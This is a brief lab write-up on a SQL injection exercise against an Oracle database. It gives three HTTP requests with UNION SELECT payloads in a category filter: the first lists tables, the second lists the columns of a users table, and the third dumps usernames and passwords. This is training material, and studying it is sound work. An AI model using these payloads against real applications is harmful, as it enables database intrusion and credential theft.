# **Listing the database contents on Oracle**

Similar to [Listing the database contents on non-Oracle databases](Listing%20the%20database%20contents%20on%20non-Oracle%20databa%201089cb7e49528092b983c818c9bc75b5.html) it is possible to list tables and columns on this Lab:

1.  List tables

```
GET /filter?category=Gifts'+UNION+SELECT+NULL,table_name+FROM+all_tables+--+- HTTP/2
```

2.  List columns

```
GET /filter?category=Gifts'+UNION+SELECT+NULL,column_name+FROM+all_tab_columns+where+table_name%3d'USERS_HPGROD'+--+- HTTP/2
```

3.  List data

```
GET /filter?category=Gifts'+UNION+SELECT+USERNAME_NTBAIU,PASSWORD_XAURRS+FROM+USERS_HPGROD+--+- HTTP/2
```

And the data is shown
